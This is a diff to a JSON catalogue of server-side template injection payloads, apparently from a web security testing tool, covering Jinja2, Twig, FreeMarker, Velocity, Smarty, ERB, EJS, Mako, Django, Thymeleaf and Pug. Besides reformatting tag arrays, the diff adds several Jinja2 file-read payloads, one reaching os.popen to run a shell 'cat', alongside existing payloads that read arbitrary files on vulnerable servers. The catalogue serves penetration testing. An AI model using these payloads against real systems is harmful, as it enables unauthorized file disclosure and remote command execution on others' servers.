@@ -12,7 +12,10 @@
       "mode": "detection",
       "template": "{{7*7}}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"],
+      "tags": [
+        "detection",
+        "arithmetic"
+      ],
       "notes": "Renders 49 if a Jinja2/Twig-style expression is evaluated."
     },
     {
@@ -23,7 +26,9 @@
       "mode": "detection",
       "template": "{{7*'7'}}",
       "expected": "7777777",
-      "tags": ["detection"],
+      "tags": [
+        "detection"
+      ],
       "notes": "Jinja2 yields 7777777 (string repeat); Twig yields 49. Useful to tell them apart."
     },
     {
@@ -33,7 +38,10 @@
       "engine": "jinja2",
       "mode": "identification",
       "template": "{{config}}",
-      "tags": ["identification", "flask"],
+      "tags": [
+        "identification",
+        "flask"
+      ],
       "notes": "In Flask, dumps the app config mapping. Confirms Jinja2 + Flask context."
     },
     {
@@ -43,7 +51,9 @@
       "engine": "jinja2",
       "mode": "identification",
       "template": "{{self}}",
-      "tags": ["identification"],
+      "tags": [
+        "identification"
+      ],
       "notes": "Renders a TemplateReference repr in Jinja2."
     },
     {
@@ -53,7 +63,10 @@
       "engine": "jinja2",
       "mode": "context",
       "template": "{{config.items()}}",
-      "tags": ["context", "flask"],
+      "tags": [
+        "context",
+        "flask"
+      ],
       "notes": "Non-destructive: lists Flask config items if available."
     },
     {
@@ -63,12 +76,102 @@
       "engine": "jinja2",
       "mode": "file-read",
       "template": "{{get_flashed_messages.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read", "flask"],
+      "tags": [
+        "file-read",
+        "flask"
+      ],
       "notes": "Environment-dependent: needs an accessible global exposing __builtins__ (Flask). Avoids fragile numeric subclass indexes."
     },
-
+    {
+      "id": "ssti-jinja2-file-lipsum",
+      "name": "Jinja2 file read via lipsum.__globals__",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{lipsum.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "jinja2"
+      ],
+      "notes": "Pure Jinja2 (no Flask needed): lipsum is a global in any Jinja2 env."
+    },
+    {
+      "id": "ssti-jinja2-file-cycler",
+      "name": "Jinja2 file read via cycler.__init__.__globals__",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{cycler.__init__.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "jinja2"
+      ],
+      "notes": "Pure Jinja2 fallback when lipsum is unavailable; cycler is also a built-in global."
+    },
+    {
+      "id": "ssti-jinja2-file-request",
+      "name": "Jinja2/Flask file read via request.application",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{request.application.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "flask"
+      ],
+      "notes": "Flask-specific: request object reaches __builtins__ via the app globals."
+    },
+    {
+      "id": "ssti-jinja2-file-urlfor",
+      "name": "Jinja2/Flask file read via url_for",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{url_for.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "flask"
+      ],
+      "notes": "Flask-specific alternative global exposing __builtins__."
+    },
+    {
+      "id": "ssti-jinja2-file-os-popen",
+      "name": "Jinja2/Flask file read via os.popen cat",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('cat <<POAD_FILE>>').read()}}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "flask",
+        "rce"
+      ],
+      "notes": "RCE-based read (uses os.popen cat). Works when open() is blocked but os is reachable; needs shell cat on target."
+    },
     {
       "id": "ssti-twig-detect",
       "name": "Twig arithmetic probe",
@@ -77,7 +180,10 @@
       "mode": "detection",
       "template": "{{7*7}}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-twig-id-strmul",
@@ -87,7 +193,9 @@
       "mode": "identification",
       "template": "{{7*'7'}}",
       "expected": "49",
-      "tags": ["identification"],
+      "tags": [
+        "identification"
+      ],
       "notes": "Twig coerces and yields 49 (unlike Jinja2's 7777777)."
     },
     {
@@ -97,8 +205,12 @@
       "engine": "twig",
       "mode": "identification",
       "template": "{{'<<POAD_MARKER>>'|upper}}",
-      "required": ["marker"],
-      "tags": ["identification"],
+      "required": [
+        "marker"
+      ],
+      "tags": [
+        "identification"
+      ],
       "notes": "Confirms Twig filter syntax by upper-casing the marker."
     },
     {
@@ -108,9 +220,13 @@
       "engine": "twig",
       "mode": "file-read",
       "template": "{{source('<<POAD_FILE>>')}}",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read"],
+      "tags": [
+        "file-read"
+      ],
       "notes": "source() returns a template file's raw contents when the loader can reach the path."
     },
     {
@@ -120,12 +236,15 @@
       "engine": "twig",
       "mode": "file-read",
       "template": "{{include('<<POAD_FILE>>')}}",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read"],
+      "tags": [
+        "file-read"
+      ],
       "notes": "include() renders the file as a template; useful only if the loader path allows it."
     },
-
     {
       "id": "ssti-freemarker-detect",
       "name": "FreeMarker arithmetic probe",
@@ -134,7 +253,10 @@
       "mode": "detection",
       "template": "${7*7}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-freemarker-id-assign",
@@ -144,7 +266,9 @@
       "mode": "identification",
       "template": "<#assign x=7*7>${x}",
       "expected": "49",
-      "tags": ["identification"]
+      "tags": [
+        "identification"
+      ]
     },
     {
       "id": "ssti-freemarker-file-include",
@@ -153,12 +277,15 @@
       "engine": "freemarker",
       "mode": "file-read",
       "template": "<#include '<<POAD_FILE>>'>",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read"],
+      "tags": [
+        "file-read"
+      ],
       "notes": "Includes the file as a template; subject to FreeMarker loader restrictions."
     },
-
     {
       "id": "ssti-velocity-detect",
       "name": "Velocity arithmetic probe",
@@ -167,7 +294,10 @@
       "mode": "detection",
       "template": "#set($x=7*7)${x}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-velocity-id-if",
@@ -176,11 +306,14 @@
       "engine": "velocity",
       "mode": "identification",
       "template": "#set($a=1)#if($a==1)<<POAD_MARKER>>#end",
-      "required": ["marker"],
-      "tags": ["identification"],
+      "required": [
+        "marker"
+      ],
+      "tags": [
+        "identification"
+      ],
       "notes": "Emits the marker only if Velocity directives are evaluated."
     },
-
     {
       "id": "ssti-smarty-id-version",
       "name": "Smarty version",
@@ -188,7 +321,9 @@
       "engine": "smarty",
       "mode": "identification",
       "template": "{$smarty.version}",
-      "tags": ["identification"],
+      "tags": [
+        "identification"
+      ],
       "notes": "Prints the Smarty version string."
     },
     {
@@ -199,7 +334,9 @@
       "mode": "detection",
       "template": "{math equation='7*7'}",
       "expected": "49",
-      "tags": ["detection"]
+      "tags": [
+        "detection"
+      ]
     },
     {
       "id": "ssti-smarty-file-fetch",
@@ -208,12 +345,15 @@
       "engine": "smarty",
       "mode": "file-read",
       "template": "{fetch file='<<POAD_FILE>>'}",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read"],
+      "tags": [
+        "file-read"
+      ],
       "notes": "fetch returns file contents when SECURITY allows local file access."
     },
-
     {
       "id": "ssti-erb-detect",
       "name": "ERB arithmetic probe",
@@ -222,7 +362,10 @@
       "mode": "detection",
       "template": "<%= 7*7 %>",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-erb-id-strmul",
@@ -232,7 +375,9 @@
       "mode": "identification",
       "template": "<%= 'a'*3 %>",
       "expected": "aaa",
-      "tags": ["identification"]
+      "tags": [
+        "identification"
+      ]
     },
     {
       "id": "ssti-erb-file-read",
@@ -241,12 +386,16 @@
       "engine": "erb",
       "mode": "file-read",
       "template": "<%= File.read('<<POAD_FILE>>') %>",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read", "ruby"],
+      "tags": [
+        "file-read",
+        "ruby"
+      ],
       "notes": "Ruby ERB can read files directly if the context evaluates arbitrary Ruby."
     },
-
     {
       "id": "ssti-ejs-detect",
       "name": "EJS arithmetic probe",
@@ -255,7 +404,10 @@
       "mode": "detection",
       "template": "<%= 7*7 %>",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-ejs-id-version",
@@ -264,7 +416,10 @@
       "engine": "ejs",
       "mode": "identification",
       "template": "<%= process.version %>",
-      "tags": ["identification", "node"],
+      "tags": [
+        "identification",
+        "node"
+      ],
       "notes": "Prints the Node.js version if the JS context is reachable."
     },
     {
@@ -274,12 +429,16 @@
       "engine": "ejs",
       "mode": "file-read",
       "template": "<%= require('fs').readFileSync('<<POAD_FILE>>') %>",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read", "node"],
+      "tags": [
+        "file-read",
+        "node"
+      ],
       "notes": "Works only where require() is reachable from the template scope."
     },
-
     {
       "id": "ssti-mako-detect",
       "name": "Mako arithmetic probe",
@@ -288,7 +447,10 @@
       "mode": "detection",
       "template": "${7*7}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-mako-file-read",
@@ -297,12 +459,16 @@
       "engine": "mako",
       "mode": "file-read",
       "template": "${open('<<POAD_FILE>>').read()}",
-      "required": ["file"],
+      "required": [
+        "file"
+      ],
       "version_dependent": true,
-      "tags": ["file-read", "python"],
+      "tags": [
+        "file-read",
+        "python"
+      ],
       "notes": "Mako evaluates arbitrary Python expressions inside ${...}."
     },
-
     {
       "id": "ssti-django-detect-add",
       "name": "Django add filter",
@@ -311,7 +477,9 @@
       "mode": "detection",
       "template": "{{7|add:7}}",
       "expected": "14",
-      "tags": ["detection"],
+      "tags": [
+        "detection"
+      ],
       "notes": "Django does not evaluate {{7*7}}; the add filter proves template rendering."
     },
     {
@@ -321,10 +489,11 @@
       "engine": "django",
       "mode": "context",
       "template": "{% debug %}",
-      "tags": ["context"],
+      "tags": [
+        "context"
+      ],
       "notes": "Dumps available context/variables when DEBUG is on. Django's template language is sandboxed: direct file read via template syntax is not supported."
     },
-
     {
       "id": "ssti-thymeleaf-detect",
       "name": "Thymeleaf inline arithmetic",
@@ -333,7 +502,10 @@
       "mode": "detection",
       "template": "[[${7*7}]]",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
     {
       "id": "ssti-thymeleaf-id-expr",
@@ -343,10 +515,12 @@
       "mode": "identification",
       "template": "[[${T(java.lang.System).getProperty('java.version')}]]",
       "version_dependent": true,
-      "tags": ["identification", "spring"],
+      "tags": [
+        "identification",
+        "spring"
+      ],
       "notes": "Reads the JVM version via SpringEL if preprocessing expressions are evaluated."
     },
-
     {
       "id": "ssti-spring-el-detect",
       "name": "Spring EL arithmetic",
@@ -355,9 +529,11 @@
       "mode": "detection",
       "template": "${7*7}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"]
+      "tags": [
+        "detection",
+        "arithmetic"
+      ]
     },
-
     {
       "id": "ssti-pug-detect",
       "name": "Pug interpolation arithmetic",
@@ -366,7 +542,10 @@
       "mode": "detection",
       "template": "#{7*7}",
       "expected": "49",
-      "tags": ["detection", "arithmetic"],
+      "tags": [
+        "detection",
+        "arithmetic"
+      ],
       "notes": "Pug/Jade interpolation evaluates JS; RCE gadgets are environment-dependent and not shipped by default."
     }
   ]
